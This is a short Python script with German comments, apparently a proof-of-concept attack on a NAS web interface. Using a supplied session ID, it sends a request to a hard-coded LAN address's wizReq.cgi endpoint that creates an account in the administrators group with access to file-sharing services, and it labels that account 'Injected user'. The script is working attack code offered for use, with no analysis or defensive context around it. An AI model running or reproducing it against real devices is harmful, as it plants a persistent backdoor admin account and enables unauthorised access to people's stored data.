import requests
import sys

def add_admin_user(sid, username, password):
    """
    Fügt einen neuen Benutzer mit Admin-Rechten hinzu.
    
    :param sid: Gültige Session-ID (SID)
    :param username: Benutzername für den neuen Nutzer
    :param password: Passwort für den neuen Nutzer
    """
    # URL für das Hinzufügen eines Benutzers
    url = f"http://192.168.178.32:8080/cgi-bin/wizReq.cgi"
    
    # Parameter der Anfrage
    params = {
        "sid": sid,
        "wiz_func": "user_create",
        "action": "add_user",
        "set_application_privilege": "1",
        "rd_share_len": "1",
        "rd_share0": "Public",
        "rw_share_len": "1",
        "rw_share0": "Multimedia",
        "no_share_len": "0",
        "a_username": username,
        "a_passwd": password,
        "gp_len": "1",  # Zugehörigkeit zu Gruppen
        "gp0": "administrators",  # Administratoren-Gruppe
        "hidden": "no",
        "oplocks": "1",
        "create_priv": "1",  # Schreibrechte
        "comment": "",
        "vol_no": "1",
        "a_description": "Injected user",
        "recursive": "1",
        "send_mail": "0",
        "AFP": "1",
        "FTP": "1",
        "SAMBA": "1",
        "WEBDAV": "1",
        "MUSIC_STATION": "1",
        "WFM": "1",
        "recycle_bin": "0",
        "recycle_bin_administrators_only": "0"
    }
    
    try:
        # Senden der Anfrage
        response = requests.get(url, params=params)
        
        # Status auswerten
        if response.status_code == 200:
            print("[*] Anfrage erfolgreich gesendet!")
            print("Antwort des Servers:")
            print(response.text)
        else:
            print(f"[!] Fehler: Server antwortete mit Status-Code {response.status_code}")
            print("Antwort des Servers:")
            print(response.text)
    except Exception as e:
        print(f"[!] Fehler beim Senden der Anfrage: {e}")


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Fehler: SID, Benutzername und Passwort müssen angegeben werden.")
        print("Verwendung: python3 add_admin_user.py <SID> <Benutzername> <Passwort>")
        sys.exit(1)
    
    # SID, Benutzername und Passwort aus den Argumenten übernehmen
    sid = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    
    # Neuen Benutzer hinzufügen
    add_admin_user(sid, username, password)
